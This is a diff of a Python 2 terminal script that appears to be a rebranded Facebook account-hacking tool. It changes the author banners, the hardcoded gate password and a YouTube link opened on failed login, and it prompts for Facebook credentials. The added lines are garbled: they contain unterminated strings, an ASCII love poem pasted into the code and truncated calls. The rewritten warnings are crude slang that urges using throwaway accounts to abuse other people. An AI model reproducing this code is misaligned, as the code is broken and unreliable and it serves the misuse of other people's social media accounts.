@@ -57,13 +57,13 @@ logo = """
     \033[1;94m::▒▒▒▒▒▒█▒▒▒█▒█▒█▒▒▒█▒█▒▒▒▒▒▒▒▒▒▒::::      
    \033[1;95m:::▒▒▒▒▒▒███▒███▒███▒███▒▒▒▒▒▒▒▒▒▒:::::         
   \033[1;96m::♧♧♧♧♧♧♧♧♧♧\033[1;91mWhatsapp\033[1;96m♧♧♧♧♧♧♧♧♧♧▒▒▒▒▒▒▒::::        
-  \033[1;91m:》》》\033[1;93m+NE-DENA\033[1;91m《《《▒▒▒▒▒▒▒▒▒▒▒:::::
-\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96m-Raza-\033[1;95m♡╭──────────•◈•──────────╮♡
-\033[1;92m..........................Raza......................
+  \033[1;91m:》》》\033[1;93m+NE-Mughal\033[1;91m《《《▒▒▒▒▒▒▒▒▒▒▒:::::
+\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96m-K4leem-\033[1;95m♡╭──────────•◈•──────────╮♡
+\033[1;92m..........................K4leem......................
 \033[1;93m╔╗ ╔╗╔═╦╦╦═╗ ╔╗╔╦═╦╦╗
-\033[1;93m║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║   Raza
+\033[1;93m║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║   K4leem
 \033[1;93m╚╝ ╚═╩═╩═╩═╝═ ╚╝╚═╩═╝ 
-\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mRaza\033[1;95m♡╰──────────•◈•──────────╯♡"""
+\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mK4leem\033[1;95m♡╰──────────•◈•──────────╯♡"""
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -89,23 +89,31 @@ print  """
  \033[1;96m ┈┈┈┈┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈
  \033[1;96m ┈┈┈┈┈┈┈┈╱▔▔▔▔┊┊┊┊▔▔▔▔╲┈┈┈┈
   \033[1;96m ─────────────•◈•──────────  
-   \033[1;92m███████▒▒Welcome To Raza CREATIONS▒▒████████
+   \033[1;92m███████▒▒Welcome To K4leem CREATIONS▒▒████████
 \033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96mRaza\033[1;95m♡╭──────────•◈•──────────╮♡
 \033[1;94mAuthor\033[1;91m: \033[1;91mAcreations
 \033[1;94mRaza\033[1;91m: \033[1;91▒▓██████████████]99.9
 \033[1;94mFacebook\033[1;91m: \033[1;91mAcreations
-\033[1;94mWhatsapp\033[1;91m: \033[1;91m NE-DENA
-\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mRaza\033[1;95m♡╰──────────•◈•──────────╯♡"""
-jalan('              \033[1;96m....................Raza.....................:')
-jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈┈┈┈   ")
-jalan('\033[1;93m   ┈┈┈┈┈┈┈▕▕╲┊┊╱▏▏┈┈┈┈┈┈┈   ')
-jalan('\033[1;93m   ┈┈┈┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈┈┈┈   ')
-jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈┈┈ ")
-jalan("\033[1;93m   ┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈")
-print "\033[1;93m♡─────╱▔▔▔▔┊┊┊┊▔▔▔▔╲───────♡\033[1;96mLogin Raza\033[1;95m♡╰──────────•◈•──────────╯♡"
+\033[1;94mWhatsapp\033[1;91m: \033[1;91m NE-Mughal
+\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mK4leem\033[1;95m♡╰──────────•◈•──────────╯♡"""
+jalan('              \033[1;96m...B44P B444P...........K4leem.....H0TA H4................:')
+jalan("   
+jalan('  (“v”) (“v”) (“v”)
+_’v’__’v’__’v’__
+(“v”) (“v”) (“v”)
+_’v’__’v’__’v’__
+(“v”) (“v”) (“v”)
+_’v’__’v’__’v’__
+I love YOU !!!
+MY DEAR…
+I WONNA LIVE WITH YOU…
+jalan('\033[1;93m  
+jalan("\033[
+jalan("\033[1;93m  
+print "\033[1;93m♡\033[1;96mLogin K4leem\033[1;95m♡╰──────────•◈•──────────╯♡"
 
-CorrectUsername = "Raza"
-CorrectPassword = "Raza"
+CorrectUsername = "Mughal"
+CorrectPassword = "Mughal"
 
 loop = 'true'
 while (loop == 'true'):
@@ -118,10 +126,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;91mWrong Password"
-            os.system('xdg-open https://www.youtube.com/channel/UC9je9oH-o4qUsp7NkXn16yQ')
+            os.system('xdg-open https://www.youtube.com/user/MegaEklers')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://www.youtube.com/channel/UC9je9oH-o4qUsp7NkXn16yQ')
+        os.system('xdg-open https://www.youtube.com/user/MegaEklers')
 
 def login():
 	os.system('clear')
@@ -131,9 +139,9 @@ def login():
 	except (KeyError,IOError):
 		os.system('clear')
 		print logo
-		jalan(' \033[1;92mWarning: \033[1;97mDo Not Use Your Personal Account' )
-		jalan(' \033[1;92m   Note: \033[1;97mUse a New Account To Login' )
-		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mRaza\033[1;95m♡──────────•◈•──────────♡"
+		jalan(' \033[1;92mWarning: \033[1;97mDo Apna real Account pa uSe mat karna lora laggya meri gairanti nhi )
+		jalan(' \033[1;92m   Note: \033[1;97mUse a New account bnao osa Gand maro logon ki )
+		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mK4leem\033[1;95m♡──────────•◈•──────────♡"
 		print('	   \033[1;94m♡\x1b[1;91m》》》》》》LOGIN WITH FACEBOOK《《《《《《\x1b[1;94m♡' )
 		print('	' )
 		id = raw_input('\033[1;96m[+] \x1b[1;92mID/Email\x1b[1;95m: \x1b[1;96m')
